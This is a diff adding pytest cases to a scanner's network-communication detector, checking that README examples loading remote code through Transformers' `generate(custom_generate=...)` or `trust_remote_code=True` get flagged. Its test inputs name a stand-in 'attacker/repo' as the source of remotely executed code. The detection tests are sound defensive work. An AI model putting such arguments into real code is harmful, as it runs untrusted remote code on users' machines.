@@ -2967,6 +2967,8 @@ class TestNetworkCommDetector:
             "trust_remote_code=allow_remote_code",
             "**{'trust_remote_code': True}",
             "**remote_options",
+            "custom_generate='attacker/repo'",
+            "**{'custom_generate': 'attacker/repo'}",
         ],
     )
     def test_readme_python_example_rejects_truthy_or_dynamic_remote_code_trust(
@@ -2990,6 +2992,53 @@ class TestNetworkCommDetector:
 
         assert any(finding["type"] == "network_library" for finding in findings)
         assert any(finding["type"] == "network_function" for finding in findings)
+
+    @pytest.mark.parametrize(
+        "generate_argument",
+        [
+            "custom_generate='attacker/repo'",
+            "custom_generate='attacker/repo', trust_remote_code=True",
+            "**{'custom_generate': 'attacker/repo'}",
+            "**{'trust_remote_code': True}",
+        ],
+    )
+    def test_readme_python_example_rejects_remote_code_through_generate(
+        self,
+        generate_argument: str,
+    ) -> None:
+        """`from_pretrained` is not the only call that loads remote code.
+
+        Since Transformers 4.55 `generate(custom_generate=...)` downloads and executes Hub-hosted
+        Python, and `generate` is a documented call, so gating only `from_pretrained` left the
+        suppression reachable through it.
+        """
+        data = (
+            "```python\nimport requests\nfrom transformers import AutoModel\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            "model = AutoModel.from_pretrained('official/model')\n"
+            f"model.generate({generate_argument})\n"
+            "requests.get(image_url, stream=True)\n```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_readme_python_example_allows_documented_generate_kwargs_unpacking(self) -> None:
+        """`model.generate(**inputs)` is the canonical documented pattern and must stay benign."""
+        data = (
+            b"```python\nimport requests\nfrom transformers import AutoModel\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"model = AutoModel.from_pretrained('official/model')\n"
+            b"inputs = {'input_ids': 1}\n"
+            b"model.generate(**inputs)\n"
+            b"requests.get(image_url, stream=True)\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
 
     def test_readme_python_example_allows_explicitly_disabled_remote_code_trust(self) -> None:
         data = (
